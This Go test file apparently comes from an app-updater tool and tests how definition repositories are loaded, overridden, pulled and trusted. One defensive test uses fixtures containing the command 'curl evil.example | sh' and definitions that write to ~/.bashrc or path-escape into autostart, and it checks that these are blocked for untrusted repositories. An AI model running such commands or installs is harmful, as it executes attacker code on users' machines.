package repo

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/gnoling/updateapps/internal/config"
	"github.com/gnoling/updateapps/internal/def"
	"github.com/gnoling/updateapps/internal/fetch"
)

const plain = "source: {type: github-release, repo: o/r}\n"

func writeRepo(t *testing.T, dir string, files map[string]string) string {
	t.Helper()
	for name, body := range files {
		p := filepath.Join(dir, name)
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// cfgWith returns a config whose apps.d is a fresh temp folder.
func cfgWith(t *testing.T, repos ...config.Repository) *config.Config {
	return &config.Config{AppDir: "/apps", AppImageDir: "/apps/appimages", Definitions: t.TempDir(), Repositories: repos}
}

func find(set *Set, id string) *def.App {
	for _, a := range set.Apps {
		if a.ID == id {
			return a
		}
	}
	return nil
}

func TestLaterRepositoryWins(t *testing.T) {
	main := writeRepo(t, t.TempDir(), map[string]string{
		"repo.yaml":           "name: Main set\nschema: 1\n",
		"README.md":           "not a definition",
		"apps.d/a.yaml":       "description: from main\n" + plain,
		"apps.d/b.yaml":       plain,
		"ignored-at-top.yaml": "this would be invalid, but apps.d/ exists so the top level isn't read\n",
	})
	local := writeRepo(t, t.TempDir(), map[string]string{"a.yaml": "description: my tweak\n" + plain, "c.yaml": plain})

	set := Load(cfgWith(t, config.Repository{Name: "main", Path: main}, config.Repository{Name: "mine", Path: local}))
	if len(set.Errors) != 0 || len(set.Apps) != 3 {
		t.Fatalf("apps=%d errors=%v", len(set.Apps), set.Errors)
	}
	if a := find(set, "a"); a.Description != "my tweak" || a.Repo != "mine" {
		t.Errorf("a = %q from %s; the later repository should win", a.Description, a.Repo)
	}
	if find(set, "b").Repo != "main" || len(set.Shadowed) != 1 || !strings.Contains(set.Shadowed[0], "a: mine overrides main") {
		t.Errorf("shadowed = %v", set.Shadowed)
	}
	if set.Repos[0].Manifest.Name != "Main set" || set.Repos[0].Apps != 2 {
		t.Errorf("repo info = %+v", set.Repos[0])
	}
}

func TestWhoDecidesWhatIsEnabled(t *testing.T) {
	theirs := writeRepo(t, t.TempDir(), map[string]string{"x.yaml": plain, "y.yaml": plain})
	mine := writeRepo(t, t.TempDir(), map[string]string{"on.yaml": plain, "off.yaml": "enabled: false\n" + plain, "nope.yaml": plain})
	cfg := cfgWith(t, config.Repository{Name: "theirs", Path: theirs, Default: "disabled"}, config.Repository{Name: "mine", Path: mine})
	cfg.Enabled = []string{"theirs/x", "off"}
	cfg.Disabled = []string{"nope"}

	set := Load(cfg)
	for id, want := range map[string]bool{
		"x":    true,  // their repo is opt-in, and I opted in (repo/id form)
		"y":    false, // ...but not to this one
		"on":   true,  // the definition's own default
		"off":  true,  // the author disabled it; this machine turns it on
		"nope": false, // this machine turns it off
	} {
		if got := find(set, id).IsEnabled(); got != want {
			t.Errorf("%s enabled = %v, want %v", id, got, want)
		}
	}
}

// Whoever controls a repository controls what its definitions do on update.
// Unless the user granted trust, that must not include running code.
func TestUntrustedRepositoryCannotRunCode(t *testing.T) {
	files := map[string]string{
		"fine.yaml":     "source: {type: github-release, repo: o/r}\ninstall: {type: extract, dest: '${APPDIR}/fine'}\n",
		"lua.yaml":      "source: {type: script, lua: 'return {version=\"1\", url=\"https://x\"}'}\n",
		"hooks.yaml":    plain + "post: ['curl evil.example | sh']\n",
		"command.yaml":  "source: {type: html, command: 'curl evil.example | sh', select: a}\n",
		"root.yaml":     plain + "asset: '*.deb'\ninstall: {type: deb}\n",
		"sysflat.yaml":  "source: {type: flatpak, remote: flathub, app: org.x.Y}\ninstall: {type: flatpak, scope: system}\n",
		"userflat.yaml": "source: {type: flatpak, remote: flathub, app: org.x.Y}\n",
		"bashrc.yaml":   plain + "install: {type: file, dest: '${HOME}/.bashrc'}\n",
		"escape.yaml":   plain + "install: {type: extract, dest: '${APPDIR}/../.config/autostart'}\n",
	}
	dir := writeRepo(t, t.TempDir(), files)
	cfg := cfgWith(t, config.Repository{Name: "stranger", Path: dir})
	set := Load(cfg)
	if len(set.Errors) != 0 {
		t.Fatal(set.Errors)
	}
	for id, blocked := range map[string]bool{
		"fine": false, "lua": false, "userflat": false,
		"hooks": true, "command": true, "root": true, "sysflat": true, "bashrc": true, "escape": true,
	} {
		a := find(set, id)
		if (a.Blocked != "") != blocked {
			t.Errorf("%s: blocked=%q, want blocked=%v", id, a.Blocked, blocked)
		}
		if blocked && !strings.Contains(a.Blocked, "repository stranger isn't trusted") {
			t.Errorf("%s: reason should name the repository and the fix: %q", id, a.Blocked)
		}
	}
	// A blocked app isn't picked up by an ordinary run.
	if got := def.Select(set.Apps, nil); len(got) != 3 {
		t.Errorf("runnable apps = %d, want the 3 harmless ones", len(got))
	}

	cfg.Repositories[0].Trusted = true
	for _, a := range Load(cfg).Apps {
		if a.Blocked != "" {
			t.Errorf("%s still blocked in a trusted repository: %s", a.ID, a.Blocked)
		}
	}
}

func TestUnusableRepositories(t *testing.T) {
	future := writeRepo(t, t.TempDir(), map[string]string{"repo.yaml": "schema: 99\n", "a.yaml": plain})
	good := writeRepo(t, t.TempDir(), map[string]string{"ok.yaml": plain, "broken.yaml": "source: {type: nope}\n"})
	set := Load(cfgWith(t,
		config.Repository{Name: "future", Path: future},
		config.Repository{Name: "unfetched", URL: "https://github.com/o/defs"},
		config.Repository{Name: "good", Path: good},
	))
	// One unusable repository (or definition) never takes the others down.
	if len(set.Apps) != 1 || set.Apps[0].ID != "ok" {
		t.Fatalf("apps = %v", set.Apps)
	}
	all := ""
	for _, e := range set.Errors {
		all += e.Error() + "\n"
	}
	for _, want := range []string{"future: needs a newer updateapps", "unfetched: hasn't been fetched yet; run: updateapps repos pull", "broken.yaml"} {
		if !strings.Contains(all, want) {
			t.Errorf("errors lack %q:\n%s", want, all)
		}
	}
}

func TestArchiveURL(t *testing.T) {
	for in, want := range map[string]string{
		"https://github.com/gnoling/updateapps-definitions": "https://api.github.test/repos/gnoling/updateapps-definitions/tarball/",
		"https://github.com/gnoling/defs.git|dev":           "https://api.github.test/repos/gnoling/defs/tarball/dev",
		"https://codeberg.org/someone/defs":                 "https://codeberg.org/someone/defs/archive/main.tar.gz",
		"https://git.example.org/someone/defs|stable":       "https://git.example.org/someone/defs/archive/stable.tar.gz",
		"https://gitlab.com/group/sub/defs|main":            "https://gitlab.com/api/v4/projects/group%2Fsub%2Fdefs/repository/archive.tar.gz?sha=main",
		"https://example.org/files/my-definitions.tar.gz":   "https://example.org/files/my-definitions.tar.gz",
		"https://example.org/dl/defs.zip?token=abc":         "https://example.org/dl/defs.zip?token=abc",
	} {
		repoURL, branch, _ := strings.Cut(in, "|")
		got, err := ArchiveURL(config.Repository{URL: repoURL, Branch: branch}, "https://api.github.test")
		if err != nil || got != want {
			t.Errorf("%s\n got %s (%v)\nwant %s", in, got, err, want)
		}
	}
	if _, err := ArchiveURL(config.Repository{URL: "https://github.com/just-an-owner"}, ""); err == nil {
		t.Error("a URL that's neither a repository nor an archive should be refused")
	}
}

// gitArchive builds what a git host serves: a tar.gz whose global pax header
// records the commit, with everything under one top-level folder.
func gitArchive(commit string, files map[string]string) []byte {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	tw.WriteHeader(&tar.Header{Typeflag: tar.TypeXGlobalHeader, Name: "pax_global_header", PAXRecords: map[string]string{"comment": commit}})
	tw.WriteHeader(&tar.Header{Typeflag: tar.TypeDir, Name: "owner-defs-abc1234/", Mode: 0o755})
	for name, body := range files {
		tw.WriteHeader(&tar.Header{Typeflag: tar.TypeReg, Name: "owner-defs-abc1234/" + name, Mode: 0o644, Size: int64(len(body))})
		tw.Write([]byte(body))
	}
	tw.Close()
	gz.Close()
	return buf.Bytes()
}

func TestPull(t *testing.T) {
	var version atomic.Int32
	var downloads atomic.Int32
	versions := []map[string]string{
		{"apps.d/a.yaml": plain, "apps.d/b.yaml": plain, "README.md": "hi"},
		{"apps.d/a.yaml": plain + "post: ['make me root']\n", "apps.d/c.yaml": plain},
		{"README.md": "oops, deleted everything"},
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		v := int(version.Load())
		etag := `"v` + string(rune('0'+v)) + `"`
		if r.Header.Get("If-None-Match") == etag {
			w.WriteHeader(http.StatusNotModified)
			return
		}
		downloads.Add(1)
		w.Header().Set("ETag", etag)
		w.Write(gitArchive("c0ffee"+string(rune('0'+v))+"000000000000000000000000000000000", versions[v]))
	}))
	defer srv.Close()
	r := config.Repository{Name: "theirs", URL: srv.URL + "/owner/defs"}
	cfg := cfgWith(t, r)
	client := fetch.New("")

	change, err := Pull(context.Background(), client, cfg, r)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(change.Added, ",") != "a,b" || !strings.HasPrefix(change.Commit, "c0ffee0") {
		t.Errorf("first pull: %+v", change)
	}
	if set := Load(cfg); len(set.Apps) != 2 || len(set.Errors) != 0 || !strings.HasPrefix(set.Repos[0].Meta.Commit, "c0ffee0") {
		t.Fatalf("after first pull: apps=%d errors=%v meta=%+v", len(set.Apps), set.Errors, set.Repos[0].Meta)
	}

	// Nothing new upstream: a conditional request, no download.
	if change, err = Pull(context.Background(), client, cfg, r); err != nil || !change.UpToDate || downloads.Load() != 1 {
		t.Errorf("second pull: %+v err=%v downloads=%d", change, err, downloads.Load())
	}

	// Upstream changed a, dropped b, added c; and a now wants to run shell.
	version.Store(1)
	change, err = Pull(context.Background(), client, cfg, r)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(change.Added, ",") != "c" || strings.Join(change.Changed, ",") != "a" || strings.Join(change.Removed, ",") != "b" || strings.Join(change.NowNeedTrust, ",") != "a" {
		t.Errorf("third pull: %+v", change)
	}
	if a := find(Load(cfg), "a"); a == nil || a.Blocked == "" {
		t.Error("the changed definition should now be blocked: the repository isn't trusted")
	}

	// A pull that would leave nothing usable is refused; what's there stays.
	version.Store(2)
	if _, err = Pull(context.Background(), client, cfg, r); err == nil || !strings.Contains(err.Error(), "no definitions") {
		t.Errorf("empty upstream: err=%v", err)
	}
	if set := Load(cfg); len(set.Apps) != 2 {
		t.Errorf("a refused pull must leave the previous copy in place, apps=%d", len(set.Apps))
	}
	if left, _ := filepath.Glob(filepath.Join(cfg.Definitions, ".theirs-pull-*")); len(left) != 0 {
		t.Errorf("work directories left behind: %v", left)
	}

	if _, err := Pull(context.Background(), client, cfg, config.Repository{Name: "mine"}); err == nil {
		t.Error("a repository without a url isn't pulled")
	}
}

// Everything lives in apps.d/<repository>/: fetched ones hold just the
// definitions (not a copy of the upstream tree), local always exists and wins,
// and a pull never replaces a folder it didn't fetch.
func TestAppsDLayout(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write(gitArchive("c0ffee0000000000000000000000000000000000", map[string]string{
			"README.md": "upstream readme", "repo.yaml": "name: Theirs\nschema: 1\n", ".github/workflows/ci.yml": "x",
			"apps.d/a.yaml": "description: upstream\n" + plain, "apps.d/fetch.lua": "return nil",
		}))
	}))
	defer srv.Close()
	main := config.Repository{Name: "main", URL: srv.URL + "/owner/defs"}
	cfg := cfgWith(t, main)
	if _, err := Pull(context.Background(), fetch.New(""), cfg, main); err != nil {
		t.Fatal(err)
	}
	var got []string
	entries, _ := os.ReadDir(filepath.Join(cfg.Definitions, "main"))
	for _, e := range entries {
		got = append(got, e.Name())
	}
	if strings.Join(got, " ") != ".updateapps-fetched.json a.yaml fetch.lua repo.yaml" {
		t.Errorf("apps.d/main/ holds %v; want just the definitions, the manifest and the fetch marker", got)
	}

	// local needs no config entry, is read last, and so overrides what was fetched.
	writeRepo(t, filepath.Join(cfg.Definitions, "local"), map[string]string{"a.yaml": "description: my copy\n" + plain})
	set := Load(cfg)
	if a := find(set, "a"); len(set.Errors) != 0 || a.Description != "my copy" || a.Repo != "local" {
		t.Errorf("a = %+v errors=%v", a, set.Errors)
	}
	if set.Repos[0].Manifest.Name != "Theirs" {
		t.Errorf("manifest should travel with the definitions: %+v", set.Repos[0].Manifest)
	}

	// Things in apps.d that won't be read are called out, not silently ignored.
	writeRepo(t, cfg.Definitions, map[string]string{"loose.yaml": plain, "forgotten/x.yaml": plain})
	all := ""
	for _, e := range Load(cfg).Errors {
		all += e.Error() + "\n"
	}
	if !strings.Contains(all, "loose.yaml isn't read: it's outside a repository folder") || !strings.Contains(all, "forgotten isn't read: no repository named forgotten") {
		t.Errorf("stray warnings:\n%s", all)
	}

	// A folder made by hand is never replaced by a pull.
	mine := config.Repository{Name: "local", URL: srv.URL + "/owner/defs"}
	if _, err := Pull(context.Background(), fetch.New(""), cfg, mine); err == nil || !strings.Contains(err.Error(), "wasn't fetched by updateapps") {
		t.Errorf("pulling over a hand-made folder: err=%v", err)
	}
	if a := find(Load(cfg), "a"); a.Description != "my copy" {
		t.Error("the hand-made folder was overwritten")
	}
}
